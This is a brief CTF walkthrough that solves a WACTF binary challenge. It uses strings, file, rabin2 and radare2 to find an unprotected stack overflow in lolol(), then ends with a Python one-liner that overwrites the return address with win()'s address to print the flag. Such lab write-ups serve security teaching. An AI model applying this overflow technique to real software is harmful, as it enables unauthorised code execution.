# WACTF Challenge walkthrough - short

- A service is running on a remote host that can be made to print a flag
- You have a copy of the compiled binary
- Work out how to print the flag

- First, the old favourite: `strings jtr`
    - "/bin/cat flag.txt"
- Get a better idea of what we're looking at: `file jtr`
    - 32 bit ELF
    - x86
    - not stripped
- A closer look at the binary's security features: `rabin2 -I jtr`
    - canary = false
    - pic = false
    - nx = true
- Run it! `./jtr`
- Buffer overflow? `python -c 'print("A" * 100)' | ./jtr`
- Time to start reversing! `r2 -AA jtr`
    - What symbols is it importing? `ii`
    - What about local functions? `afl`
    - The win() function seems to be of interest. Let's have a look: `pdf@sym.win`
    - Let's see what the path is to get to win(): `axg@sym.win`
        - Oh no! How will we get win() to run?!
    - Let's look at lolol(): `pdf@sym.lolol`
        - This is where the overflow occurs
- Let's build the exploit!
    - We can work out required padding easily by debugging lolol()
        - (Or just blast the address 100*)
    - We then get the address of win to put into eip: `afo sym.win`
    - `python -c 'print("A" * 44 + "\x96\x84\x04\x08")' | ./jtr`